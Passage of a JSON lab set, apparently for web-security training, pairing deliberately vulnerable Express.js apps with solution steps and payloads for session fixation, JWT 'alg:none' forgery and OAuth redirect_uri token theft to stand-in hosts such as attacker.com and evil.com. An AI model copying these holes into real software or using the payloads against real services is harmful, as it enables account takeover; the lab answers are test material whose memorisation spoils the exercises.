  "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst request = require('request');\nconst app = express();\napp.use(session({ secret: 'oauthfix', resave: false, saveUninitialized: true }));\n\napp.get('/login', (req, res) => {\n  const state = req.query.state || Math.random().toString(36).substring(2);\n  req.session.oauthState = state;\n  res.redirect(`https://oauth.example.com/auth?response_type=code&client_id=abc123&redirect_uri=http://localhost:4000/callback&state=${state}`);\n});\n\napp.get('/callback', (req, res) => {\n  if (req.query.code) {\n    // No validation of 'state'!\n    req.session.loggedInAs = 'victim';\n    res.redirect('/dashboard');\n  } else {\n    res.send('OAuth failed');\n  }\n});\n\napp.get('/dashboard', (req, res) => {\n  if (req.session.loggedInAs) {\n    res.send(`Welcome ${req.session.loggedInAs}!`);\n  } else {\n    res.status(403).send('Unauthorized');\n  }\n});\n\napp.listen(4000, () => console.log('OAuth State Fixation Lab running on http://localhost:4000'));",
  "payloads": [
    "http://localhost:4000/login?state=attackerFixedState",
    "Captured OAuth URL with state=attackerFixedState",
    "Hijack victim session using state reuse in OAuth redirect"
  ]
},
{
  "Lab scenario": "SOAP API session fixation via Set-Cookie override",
  "Lab Description": "The application uses a SOAP API for authentication and sets session cookies during login. A flaw allows overriding the session identifier via a crafted Set-Cookie header, leading to session fixation. To solve: fix a session for the victim and access their account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to capture the SOAP Login request and observe the Set-Cookie response.",
    "Manually craft a POST login request with a predefined session ID using 'Cookie: sessionid=attacker123'.",
    "Send the crafted login URL to the victim, encouraging them to log in while your session is active.",
    "When the victim logs in, their session becomes linked to 'attacker123'.",
    "Use the same session ID to access /myaccount and confirm the victim is authenticated."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(bodyParser.text({ type: 'application/soap+xml' }));\napp.use(cookieParser());\n\nlet sessions = {};\n\napp.post('/soap-login', (req, res) => {\n  const soapRequest = req.body;\n  const match = soapRequest.match(/<username>(.*?)<\\/username><password>(.*?)<\\/password>/);\n  if (!match) return res.status(400).send('Invalid SOAP');\n\n  const [_, username, password] = match;\n  if (username === 'carlos' && password === 'password123') {\n    const sid = req.cookies.sessionid || 'session_' + Math.random().toString(36).substring(2);\n    sessions[sid] = username;\n    res.setHeader('Set-Cookie', `sessionid=${sid}`);\n    return res.send(`<soap:Envelope><soap:Body><loginResponse>Success</loginResponse></soap:Body></soap:Envelope>`);\n  }\n  res.send(`<soap:Envelope><soap:Body><loginResponse>Failure</loginResponse></soap:Body></soap:Envelope>`);\n});\n\napp.get('/myaccount', (req, res) => {\n  const user = sessions[req.cookies.sessionid];\n  if (!user) return res.status(403).send('Unauthorized');\n  res.send(`Account page for ${user}`);\n});\n\napp.listen(4000, () => console.log('SOAP Session Fixation Lab running on http://localhost:4000'));",
  "payloads": [
    "POST /soap-login with header Cookie: sessionid=attacker123",
    "SOAP Body: <username>carlos</username><password>password123</password>",
    "Access /myaccount with Cookie: sessionid=attacker123"
  ]
},
{
  "Lab scenario": "Session Fixation in SOAP Login API",
  "Lab Description": "The SOAP-based authentication system incorrectly maintains session identifiers across users. The application sets a session cookie during the initial request and does not regenerate it post-login. To solve: Hijack a victim's authenticated session by fixing a known session ID before login.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to send a SOAP login request for your own account and observe the JSESSIONID assigned in the response.",
    "Use Burp Repeater to send a crafted SOAP login request with a fixed JSESSIONID in the Cookie header.",
    "Send a malicious link containing the fixed JSESSIONID to the victim, prompting them to log in with it.",
    "Once the victim logs in, revisit the application using the fixed JSESSIONID to hijack their session.",
    "Access /account/overview using the hijacked session cookie to confirm account takeover."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.text({ type: 'text/xml' })); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'victim', password: 'vpass' }]; app.post('/soap-login', (req, res) => { const { headers, body } = req; const match = /<username>(.*?)<\\/username><password>(.*?)<\\/password>/s.exec(body); if (!match) return res.status(400).send('Malformed XML'); const [_, username, password] = match; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid credentials'); const sessionId = headers.cookie?.split('=')[1] || Math.random().toString(36).slice(2); sessions[sessionId] = username; res.setHeader('Set-Cookie', `JSESSIONID=${sessionId}`); res.send(`<login><status>success</status></login>`); }); app.get('/account/overview', (req, res) => { const username = sessions[req.cookies.JSESSIONID]; if (!username) return res.status(401).send('Not authenticated'); res.send(`Welcome back, ${username}`); }); app.listen(4000, () => console.log('Session Fixation SOAP lab running'));",
  "payloads": [
    "Cookie: JSESSIONID=fixedSessionId",
    "<?xml version='1.0'?><soap><username>victim</username><password>vpass</password></soap>"
  ]
},
{
  "Lab scenario": "JWT signature none algorithm tampering",
  "Lab Description": "The REST API uses JWT for authentication but does not validate the signature algorithm correctly. The backend accepts tokens with the `alg` header set to `none` and skips signature verification. To solve: Forge an administrative token and access the admin panel.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Log in as a normal user and intercept the Authorization Bearer token using Burp Suite.",
    "Decode the JWT at jwt.io and observe the structure and claims.",
    "Change the `alg` field in the header to `none` and add \"role\":\"admin\" in the payload.",
    "Remove the signature part and replay the token using Postman to the /admin endpoint.",
    "Access the /admin panel successfully with forged privileges to complete the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') return res.sendStatus(403); const token = jwt.sign({ username, role: 'user' }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Welcome Admin'); res.status(403).send('Forbidden'); }); app.listen(4001, () => console.log('JWT None Bypass Lab running'));",
  "payloads": [
    "{ \"alg\": \"none\" }.{ \"username\": \"user\", \"role\": \"admin\" }.",
    "Authorization: Bearer {forged_token}"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration with open redirect and implicit flow",
  "Lab Description": "The OAuth integration uses the implicit flow without validating redirect URIs properly. This allows token interception via an attacker-controlled domain. To solve: Trick the victim into authorizing on your redirect URI, capture their token, and access their account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Analyze the OAuth login flow with Burp Suite and identify the authorization request URL.",
    "Modify the redirect_uri parameter to point to your malicious server (e.g., https://attacker.com/token-catcher).",
    "Send the crafted URL to the victim and simulate them clicking it (or use social engineering).",
    "Capture the access token via your server logs from the redirected request.",
    "Use Postman to call /api/user-info with the stolen token and confirm access to the victim’s data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, client_id } = req.query; if (!redirect_uri.startsWith('https://')) return res.status(400).send('Invalid redirect'); const token = Buffer.from('victim:access123').toString('base64'); res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/api/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (Buffer.from(token, 'base64').toString().startsWith('victim')) return res.send('Welcome, victim'); res.status(403).send('Invalid token'); }); app.listen(4002, () => console.log('OAuth Open Redirect Lab running'));",
  "payloads": [
    "https://auth.example.com/auth?client_id=xyz&redirect_uri=https://attacker.com/token-catcher&response_type=token",
    "Authorization: Bearer dmljdGltOmFjY2VzczEyMw=="
  ]
},
{
  "Lab scenario": "Session Fixation via Pre-Auth Token Reuse in Login Flow",
  "Lab Description": "The application mishandles session identifiers during the authentication process. It fails to regenerate session IDs upon login, allowing session fixation attacks. The application uses a fixed session cookie across unauthenticated and authenticated states. To solve: Hijack Carlos's session by fixing the session ID before they log in, then access their My Account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use OWASP ZAP to observe that session cookies remain unchanged after login.",
    "Manually generate a valid session cookie before login using /auth/init and capture its value.",
    "Send the session ID to the victim via a crafted link to initiate login under that session.",
    "Wait for the victim to authenticate using your pre-fixed session ID.",
    "Reuse the session ID to access /my-account and confirm session hijack."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'notregenerated', resave: true, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'supersecret' }]; app.get('/auth/init', (req, res) => { res.send('Session initialized'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); req.session.user = username; res.send(`Logged in as ${username}`); }); app.get('/my-account', (req, res) => { if (req.session.user !== 'carlos') return res.status(403).send('Forbidden'); res.send('Carlos Account Data'); }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
  "payloads": [
    "GET /auth/init to create session",
    "Use attacker-controlled link to send fixed session cookie",
    "GET /my-account with fixed session cookie"
  ]
},
{
  "Lab scenario": "JWT Key Confusion via Algorithm Downgrade in GraphQL API",
  "Lab Description": "The app uses JWTs to authorize GraphQL requests but does not enforce strict algorithm checking, accepting tokens signed with 'none'. This allows algorithm confusion where the attacker forges a token using 'none' to impersonate users. To solve: Access the sensitive data node for Carlos by forging a valid-looking JWT.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept the Authorization header for a valid request.",
    "Notice the 'alg' in the JWT is 'HS256', but the server accepts 'none'.",
    "Modify the JWT to set 'alg' to 'none' and change the payload to { \"username\": \"carlos\" }.",
    "Remove the signature part entirely and resend the token.",
    "Access the GraphQL query `{account(username: \"carlos\") { secrets }}` using Postman with the modified token."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', secrets: 'TopSecretData' }]; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { req.user = decoded.payload.username; } else { try { jwt.verify(token, 'secret'); req.user = decoded.payload.username; } catch (e) { return res.status(401).send('Invalid JWT'); } } const user = users.find(u => u.username === req.user); if (req.body.query.includes('account') && user) { return res.json({ data: { account: { secrets: user.secrets } } }); } res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT Confusion Lab running on port 4000'));",
  "payloads": [
    "JWT: { \"alg\": \"none\", \"payload\": { \"username\": \"carlos\" } }",
    "Authorization: Bearer [header.payload.]",
    "GraphQL query: { account(username: \"carlos\") { secrets } }"
  ]
},
{
  "Lab scenario": "OAuth Authorization Code Interception via Open Redirect",
  "Lab Description": "The application integrates with a third-party OAuth provider but lacks validation on the redirect_uri parameter, enabling open redirect attacks. This allows intercepting the authorization code during OAuth login. To solve: Steal Carlos's OAuth authorization code and use it to log in as Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to analyze the OAuth login flow and find an open redirect vulnerability in the redirect_uri parameter.",
    "Craft a malicious URL to redirect authorization code to your server (e.g., https://evil.com/log?code=...).",
    "Send the malicious link to Carlos and capture the code from incoming requests.",
    "Use Postman to exchange the stolen code for an access token by calling /oauth/token.",
    "Replay login with the obtained token and access /my-account as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/login/oauth', (req, res) => { const redirect = req.query.redirect_uri; const state = req.query.state; const url = `https://auth-provider.com/authorize?client_id=app123&redirect_uri=${redirect}&state=${state}`; res.redirect(url); }); app.get('/oauth/callback', (req, res) => { const code = req.query.code; request.post('https://auth-provider.com/token', { form: { code, client_id: 'app123', client_secret: 'secret123' } }, (err, response, body) => { if (err) return res.status(500).send('Token exchange failed'); res.send('Logged in with OAuth'); }); }); app.get('/my-account', (req, res) => { res.send('Carlos Account Info'); }); app.listen(5000, () => console.log('OAuth Redirect Lab running on port 5000'));",
  "payloads": [
    "https://vulnerable-app.com/login/oauth?redirect_uri=https://evil.com/log",
    "Captured code=abc123",
    "POST /oauth/token with code=abc123",
    "Access /my-account with resulting token"
  ]
},
{
  "Lab scenario": "Session Fixation in Login Redirection Mechanism",
  "Lab Description": "The application incorrectly allows pre-authenticated session IDs to persist through login. An attacker can fix a session ID for a victim and hijack the session post-login. The application accepts session IDs via URL query parameters and uses them post-login. To solve: hijack Carlos’s session by fixing a session ID and accessing his account page after login.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to intercept the login request and notice the session ID being reused from a GET parameter (?sid=...)",
    "2. Generate a session ID manually and craft a malicious login URL: /login?sid=attackerSession",
    "3. Send this URL to the victim and wait for them to authenticate using it (assume link click)",
    "4. Monitor /my-account using Burp with sid=attackerSession and check for session elevation",
    "5. Access Carlos’s account using the fixed session"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const uuid = require('uuid'); const app = express(); const sessions = {}; const users = { carlos: 'supersecret' }; app.use(express.urlencoded({ extended: true })); app.use((req, res, next) => { const sid = req.query.sid || req.cookies?.sid; if (sid) req.sessionID = sid; next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.sessionID] = username; res.send('Logged in!'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { if (sessions[req.sessionID] === 'carlos') res.send('Account: Carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab on port 4000'));",
  "payloads": [
    "GET /login?sid=attackerSession",
    "POST /login with body: username=carlos&password=supersecret",
    "GET /my-account?sid=attackerSession"
  ]
},
{
  "Lab scenario": "JWT Tampering in GraphQL Authorization Header",
  "Lab Description": "This GraphQL-based API uses JWT for user authentication, but improperly accepts tokens signed with 'alg':'none'. This allows attackers to forge arbitrary tokens. The vulnerable middleware fails to verify the signature when alg=none. To solve: forge an admin JWT and query the adminGraph.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Postman to send a GraphQL introspection query and discover the 'adminGraph' endpoint.",
    "2. Analyze a valid JWT using jwt.io and note header/payload structure.",
    "3. Forge a new token with 'alg':'none' and 'role':'admin' in payload; remove the signature.",
    "4. Set this token in the Authorization: Bearer header.",
    "5. Send a GraphQL query to { adminGraph { secret } } to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const graphqlHTTP = require('express-graphql'); const schema = require('./schema'); app.use('/graphql', (req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; try { req.user = jwt.verify(token, 'hardcoded-secret'); } catch (e) { if (JSON.parse(Buffer.from(token.split('.')[0], 'base64').toString()).alg === 'none') req.user = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); } next(); }); app.use('/graphql', graphqlHTTP((req) => ({ schema, graphiql: true, context: { user: req.user } }))); app.listen(4000, () => console.log('JWT None GraphQL Lab running'));",
  "payloads": [
    "{ \"alg\": \"none\" }.{ \"role\": \"admin\" }.",
    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
    "GraphQL query: { adminGraph { secret } }"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration in Redirect URI Handling",
  "Lab Description": "The application integrates with a third-party OAuth provider but improperly validates the redirect_uri parameter. An attacker can manipulate this parameter to intercept OAuth tokens. The system allows open redirect behavior with a whitelisted domain suffix only. To solve: capture Carlos’s OAuth code via redirect hijack and access his account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use OWASP ZAP to crawl the /auth endpoint and identify redirect_uri parameter.",
    "2. Send a login URL with redirect_uri=https://attacker.com%23access_token=... (bypassing suffix check via encoded fragment).",
    "3. Host a malicious redirector to log captured tokens.",
    "4. Use captured token to call /oauth-callback and gain access to Carlos’s account.",
    "5. Visit /my-account with valid session/cookie."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; if (!redirect_uri.endsWith('trusted.com')) return res.status(400).send('Invalid redirect'); const token = 'carlos-oauth-token'; res.redirect(redirect_uri + '#access_token=' + token); }); app.get('/oauth-callback', (req, res) => { const token = req.query.token; if (token === 'carlos-oauth-token') res.send('Carlos account accessed'); else res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Redirect URI Lab running'));",
  "payloads": [
    "GET /auth?redirect_uri=https://attacker.com%23access_token=carlos-oauth-token",
    "Capture #access_token from attacker.com logs",
    "GET /oauth-callback?token=carlos-oauth-token"
  ]
},
{
  "Lab scenario": "Session fixation in SAML SSO login flow",
  "Lab Description": "This lab simulates a vulnerable Single Sign-On (SSO) integration using SAML. Due to poor session handling during the pre-authentication phase, attackers can fix a session ID before login. The application reuses the existing session after successful SAML login without regenerating a new session ID. To solve: Hijack Carlos’s account session using a pre-fixed session ID.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to intercept a pre-authenticated GET /sso-init request. Note the Set-Cookie: session ID issued.",
    "2. Log out and forward this session ID to Burp Intruder for future fixation testing.",
    "3. Initiate the SSO flow again but manipulate the session ID manually by injecting your known session cookie.",
    "4. Complete SSO login using your own credentials while ensuring the fixed session ID remains unchanged.",
    "5. Share the fixed session cookie with another browser or curl instance and observe the hijacked post-login session under Carlos’s account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/sso-init', (req, res) => { const sid = Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('session', sid); res.redirect('/sso-login'); }); app.post('/sso-login', (req, res) => { const sid = req.cookies.session; const user = req.body.user; if (!sid || !sessions[sid]) return res.status(400).send('Invalid session'); sessions[sid].authenticated = true; sessions[sid].user = user; res.send(`Welcome ${user}`); }); const PORT = 4000; app.listen(PORT, () => console.log('SSO Fixation Lab at http://localhost:' + PORT));",
  "payloads": [
    "Set-Cookie: session=fixedSessionID123;",
    "POST /sso-login HTTP/1.1 with Cookie: session=fixedSessionID123 and user=carlos",
    "Reuse fixedSessionID123 in secondary browser"
  ]
},
{
  "Lab scenario": "JWT none algorithm authentication bypass",
  "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management. However, the token verification logic does not enforce algorithm validation, allowing an attacker to forge tokens using 'alg: none'. To solve: Forge a valid JWT with admin privileges and access the admin dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite or Postman to intercept a request containing an Authorization: Bearer <JWT> header.",
    "2. Decode the JWT using jwt.io and observe the alg value in the header.",
    "3. Replace 'alg' with 'none' and modify the payload to {\"username\": \"admin\"}.",
    "4. Base64 encode the new header and payload. Remove the signature entirely.",
    "5. Reuse the forged JWT to access the /admin route and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.username === 'admin') res.send('Welcome admin'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT None Bypass Lab running at http://localhost:' + PORT));",
  "payloads": [
    "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
    "Payload: { \"username\": \"admin\" }",
    "Forged JWT: <Base64(header)>.<Base64(payload)>."
  ]
},
{
  "Lab scenario": "OAuth misconfiguration leaking authorization code to attacker",
  "Lab Description": "The application uses OAuth for user authentication. It incorrectly allows redirection to arbitrary domains, including those under attacker control. This redirection vulnerability enables the attacker to intercept the authorization code. To solve: Capture Carlos’s authorization code using a malicious redirect URI and exchange it for an access token.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use OWASP ZAP to intercept the OAuth authorization request to /auth?client_id=...&redirect_uri=...",
    "2. Modify the redirect_uri parameter to point to a server under your control (e.g., https://evil.com/callback).",
    "3. Send the link to Carlos or wait for him to authenticate via phishing.",
    "4. Capture the code parameter from the redirected request on your server.",
    "5. Exchange the captured code at the /token endpoint to receive an access_token and access the victim’s profile."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const codes = {}; app.get('/auth', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = Math.random().toString(36).substring(2); codes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/token', (req, res) => { const { code } = req.body; const user = codes[code]; if (user) res.json({ access_token: 'token-for-' + user }); else res.status(400).send('Invalid code'); }); app.get('/profile', (req, res) => { const { access_token } = req.query; if (access_token === 'token-for-carlos') res.send('Carlos profile data'); else res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfig Lab on http://localhost:' + PORT));",
  "payloads": [
    "GET /auth?client_id=app123&redirect_uri=https://evil.com/callback",
    "GET /token with code=<intercepted_code>",
    "GET /profile?access_token=token-for-carlos"
  ]
},
{
  "Lab scenario": "Session Fixation in REST-based login endpoint",
  "Lab Description": "The application's login mechanism is vulnerable to session fixation due to session ID reuse. The application does not regenerate the session ID upon successful login. To solve: Fixate the victim’s session ID before they log in, then hijack their session and access their profile page.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Using Burp Suite, intercept a GET /login request and observe the session cookie issued before authentication.",
    "2.Send the session cookie to the victim via social engineering or inject it into a URL as a phishing link.",
    "3.After the victim logs in using the fixed session, reuse the same session ID in your browser.",
    "4.Navigate to /profile and confirm access to the victim's authenticated session.",
    "5.Validate exploitation by checking victim’s profile data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'secretKey', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; app.get('/login', (req, res) => { res.send('Login page - Session ID: ' + req.sessionID); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.authenticated = true; req.session.username = username; res.send('Logged in successfully'); } else { res.status(401).send('Login failed'); } }); app.get('/profile', (req, res) => { if (req.session.authenticated) { res.send('Welcome ' + req.session.username + ', here is your profile.'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
  "payloads": [
    "Phishing URL with session ID: http://vulnerable-app.com/login?PHPSESSID=known_session_id",
    "Browser cookie injection: document.cookie='PHPSESSID=known_session_id'"
  ]
},
{
  "Lab scenario": "JWT 'none' algorithm authentication bypass in GraphQL API",
  "Lab Description": "The GraphQL login API accepts JWT tokens with 'none' algorithm and skips signature verification. To solve: Forge a JWT with alg=none to impersonate Carlos and access the /graphql profile query.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Intercept the login request via Postman and observe the Authorization: Bearer <JWT> header after login.",
    "2.Decode the JWT and note the structure and payload.",
    "3.Craft a new JWT with 'alg':'none', 'username':'carlos' and no signature.",
    "4.Use the forged token in the Authorization header to query the profile.",
    "5.Verify profile access for Carlos to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const schema = buildSchema(`type Query { profile: String }`); const root = { profile: (args, req) => req.user ? `Welcome ${req.user.username}` : 'Unauthorized' }; app.use((req, res, next) => { const auth = req.headers['authorization']; if (auth) { try { const token = auth.split(' ')[1]; req.user = jwt.verify(token, 'secretKey', { algorithms: ['HS256', 'none'] }); } catch (err) { console.log('JWT Error:', err.message); } } next(); }); app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true })); app.listen(4001, () => console.log('JWT None Bypass Lab on http://localhost:4001/graphql'));",
  "payloads": [
    "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
    "Payload: { \"username\": \"carlos\" }",
    "Final JWT: <base64(header)>.<base64(payload)>."
  ]
},
{
  "Lab scenario": "OAuth token leakage via redirect URI in SOAP-based client",
  "Lab Description": "The application uses OAuth implicit flow and allows arbitrary redirect URIs. This leads to token leakage when attackers inject malicious redirect URIs. To solve: Extract the victim's access token via a crafted OAuth authorization link, then use it to call a SOAP action on behalf of Carlos.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Initiate an OAuth flow and observe the redirect URI behavior in the SOAP client’s login form.",
    "2.Create a malicious authorization URL with redirect_uri pointing to attacker.com.",
    "3.Trick the victim into clicking the OAuth URL and capture the access token via URL fragment.",
    "4.Use SOAP UI or Postman to call the SOAP getUserDetails action with Authorization: Bearer <token>.",
    "5.Verify that you retrieved Carlos’s data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const tokens = { 'abc123': { username: 'carlos' } }; app.get('/oauth/authorize', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; const token = 'abc123'; // hardcoded for demo res.redirect(`${redirect_uri}#access_token=${token}`); }); app.post('/soap', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Unauthorized'); const token = auth.split(' ')[1]; const user = tokens[token]; if (user) { res.send(`<soap:Envelope><soap:Body><username>${user.username}</username></soap:Body></soap:Envelope>`); } else { res.status(403).send('Invalid token'); } }); app.listen(4002, () => console.log('OAuth Token Leak Lab running on port 4002'));",
  "payloads": [
    "https://auth.example.com/oauth/authorize?response_type=token&client_id=app123&redirect_uri=https://attacker.com",
    "Authorization: Bearer abc123",
    "SOAP Body: <soap:Envelope><soap:Body><getUserDetails/></soap:Body></soap:Envelope>"
  ]
},
{
  "Lab scenario": "Session Fixation in GraphQL Login Mutation",
  "Lab Description": "The GraphQL API login endpoint uses a fixed session ID before authentication, allowing session fixation. The application accepts a `sessionid` cookie that is issued before login and preserved after authentication. To solve: Hijack a victim's session by predefining a session ID, tricking them into using it, and authenticating as them.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Using Burp Suite, observe that an unauthenticated POST /graphql mutation returns a `Set-Cookie: sessionid=<random>` before login.",
    "2.Use Burp Repeater to issue a fixed sessionid cookie like `sessionid=attackersession123` and call the login mutation. Notice it stays unchanged after successful login.",
    "3.Share a crafted phishing link to the victim pointing to `https://vulnerable-app/login` with the session cookie pre-set using JavaScript (via reflected XSS or email).",
    "4.After the victim logs in using the pre-set session ID, capture authenticated responses using the same sessionid=attackersession123 in your own requests.",
    "5.Verify you can access /my-account GraphQL query using the fixed session cookie to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 's3cret' }]; const sessions = {}; app.post('/graphql', (req, res) => { const sid = req.cookies.sessionid || Math.random().toString(36).substring(2); if (!sessions[sid]) sessions[sid] = { authenticated: false }; const { query } = req.body; if (query.includes('login')) { const [_, username, password] = query.match(/login\\(username: \"(.*?)\", password: \"(.*?)\"\\)/); const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sid].authenticated = true; res.cookie('sessionid', sid); return res.send({ data: { login: true } }); } } if (query.includes('myAccount') && sessions[sid]?.authenticated) return res.send({ data: { myAccount: 'Carlos Account Data' } }); res.status(403).send({ error: 'Unauthorized' }); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
  "payloads": [
    "Cookie: sessionid=attackersession123",
    "GraphQL Mutation: mutation { login(username: \"carlos\", password: \"s3cret\") }",
    "GraphQL Query: query { myAccount }"
  ]
},
{
  "Lab scenario": "JWT Authentication Bypass via 'none' Algorithm in REST API",
  "Lab Description": "The application uses JWT tokens for user sessions, but fails to validate the `alg` field. The server accepts JWTs with `alg: none`, allowing unsigned tokens. To solve: Forge a JWT token for the user `carlos` and access the protected profile endpoint.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Log in as your own user and intercept the POST /login response using Burp Suite. Capture the JWT token from the Set-Cookie header.",
    "2.Decode the JWT using jwt.io and observe the algorithm is `HS256`, but the server doesn't validate it.",
    "3.Craft a new JWT header: { \"alg\": \"none\", \"typ\": \"JWT\" } and payload: { \"username\": \"carlos\" }, then base64 encode them and omit the signature part.",
    "4.Set this forged JWT in the Authorization header as `Bearer <token>`.",
    "5.Send a GET /profile request using Postman with the forged JWT and verify you access Carlos's profile."
  ],
  "Vulnerability name": "Authentication",
